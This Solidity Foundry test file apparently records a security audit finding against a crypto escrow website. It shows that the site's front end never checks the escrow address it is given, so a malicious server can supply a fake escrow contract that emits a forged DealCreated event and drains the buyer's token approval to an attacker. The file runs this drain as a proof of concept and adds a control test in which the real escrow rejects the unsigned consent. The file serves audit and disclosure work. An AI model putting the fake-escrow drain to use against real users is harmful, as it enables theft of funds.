// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";
import "../src/AttackerEscrow.sol";

// ROUND 14 — K-841 (Team B mechanism, Team A forge leg).
// Website /d/ chunk page-16d1cf063b916c2c.js (sha 4140f516…): M(e) sends
// createDeal to `n.escrow.address` from GET /api/buyer/<token>; V(e) sends
// approve + fundPayment to `e.escrowAddress || n.escrow.address`. Neither
// is ever compared with the hardcoded HI
// (0xd961cA37e339E14e0D3478383a252E218fe7aa4a, module 82193, used 0x in the
// chunk). A malicious server points both at this AttackerEscrow:
//   * createDeal emits a FAKE DealCreated -> M(e)'s only post-check passes.
//   * fundPayment drains the V(e) approval straight to the attacker.
// The REAL escrow (etched zerofee v3) is the control: it REJECTS the same
// unsigned consent, and holds 0 deals after the attack.
contract Round14BTest is Test {
    address constant ESCROW = 0xd961cA37e339E14e0D3478383a252E218fe7aa4a;

    uint256 constant VICTIM_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant ATTACKER_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    uint256 constant SELLER_PK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
    address victim; address attacker; address seller;
    MockERC20 usdg;
    AttackerEscrow fake;

    event DealCreated(uint256 indexed id, address indexed buyer, address indexed seller, uint16 feeBps);

    function setUp() public {
        vm.chainId(4663);
        victim = vm.addr(VICTIM_PK);
        attacker = vm.addr(ATTACKER_PK);
        seller = vm.addr(SELLER_PK);
        vm.etch(ESCROW, vm.parseBytes(vm.readFile("bytecode/escrow-v3-zerofee.hex")));
        vm.store(ESCROW, bytes32(uint256(5)), bytes32(uint256(1))); // guard unlocked
        vm.store(ESCROW, bytes32(uint256(0)), bytes32(uint256(1))); // nextId = 1
        usdg = new MockERC20();
        usdg.mint(victim, 100000 * 10 ** 6); // raw 6-dec units
        fake = new AttackerEscrow(address(usdg), attacker);
        vm.deal(victim, 100 ether);
        vm.warp(1000);
    }

    function _fakeCreateDeal() internal returns (bool ok, uint256 id) {
        AttackerEscrow.P memory p = AttackerEscrow.P({
            seller: seller, sellerPayout: seller, buyerReceive: victim,
            sellToken: address(0x1234), sellAmount: 100 ether,
            payToken: address(usdg), payAmount: 500 * 10 ** 6,
            deadline: uint64(block.timestamp + 7 days)});
        AttackerEscrow.Q memory q = AttackerEscrow.Q({feeBps: 100, expiry: uint64(block.timestamp + 3600), sig: new bytes(65)});
        AttackerEscrow.C memory c = AttackerEscrow.C({validUntil: uint64(block.timestamp + 86400), sig: new bytes(65)});
        bytes memory ret;
        vm.prank(victim);
        (ok, ret) = address(fake).call(
            abi.encodeWithSelector(AttackerEscrow.createDeal.selector, p, q, c));
        if (ok) id = abi.decode(ret, (uint256));
    }

    // ---- K-841 P1 (forge leg): fake escrow emits DealCreated + drains ----
    function testK841FakeEscrowDrains() public {
        uint256 amt = 500 * 10 ** 6;
        // M(e): createDeal to the FAKE escrow with fully honest params.
        vm.expectEmit(true, true, true, true, address(fake));
        emit DealCreated(1, victim, seller, 100);
        (bool ok, uint256 id) = _fakeCreateDeal();
        assertTrue(ok, "createDeal on the fake escrow must succeed (no verification)");
        assertEq(id, 1, "fake DealCreated id is 1");
        // V(e): approve(token, fake, 500) + fundPayment(1) on the fake escrow.
        vm.prank(victim);
        usdg.approve(address(fake), amt);
        uint256 attackerBefore = usdg.balanceOf(attacker);
        vm.prank(victim);
        (bool ok2,) = address(fake).call(abi.encodeWithSelector(AttackerEscrow.fundPayment.selector, uint256(1)));
        assertTrue(ok2, "fundPayment on the fake escrow must succeed");
        uint256 gained = usdg.balanceOf(attacker) - attackerBefore;
        emit log_named_uint("K-841 attacker USDG gained (raw 6-dec units)", gained);
        assertEq(gained, amt, "attacker drains the full 500 USDG approval");
        // The REAL escrow has no deal at all.
        assertEq(uint256(vm.load(ESCROW, bytes32(uint256(0)))), 1, "real escrow nextId still 1: 0 deals created");
        assertEq(usdg.balanceOf(ESCROW), 0, "real escrow holds 0 USDG");
        assertEq(usdg.balanceOf(victim), 100000 * 10 ** 6 - amt, "victim paid the full 500 USDG and received nothing");
    }

    // ---- K-841 control (forge leg): the REAL escrow rejects unsigned consent ----
    // Same honest params, zero signatures, sent to the real v3 escrow: it
    // must revert, proving the fake escrow's acceptance is the hole (the
    // website never gives the real escrow a chance to check anything).
    struct RP { address seller; address sellerPayout; address buyerReceive; address sellToken; uint256 sellAmount; address payToken; uint256 payAmount; uint64 deadline; }
    struct RQ { uint16 feeBps; uint64 expiry; bytes sig; }
    struct RC { uint64 validUntil; bytes sig; }
    function testK841RealEscrowRejectsUnsigned() public {
        RP memory p = RP({seller: seller, sellerPayout: seller, buyerReceive: victim,
            sellToken: address(0x1234), sellAmount: 100 ether, payToken: address(usdg),
            payAmount: 500 * 10 ** 6, deadline: uint64(block.timestamp + 7 days)});
        RQ memory q = RQ({feeBps: 100, expiry: uint64(block.timestamp + 3600), sig: new bytes(65)});
        RC memory c = RC({validUntil: uint64(block.timestamp + 86400), sig: new bytes(65)});
        bytes memory data = abi.encodeWithSelector(bytes4(0xaaf5e2be), p, q, c);
        vm.prank(victim);
        (bool ok,) = ESCROW.call(data);
        assertFalse(ok, "real escrow must REJECT the unsigned consent");
        assertEq(uint256(vm.load(ESCROW, bytes32(uint256(0)))), 1, "real escrow still has 0 deals");
        emit log_string("K-841: real escrow rejects unsigned consent; fake escrow accepts anything - the website's missing address pin is the whole hole");
    }
}
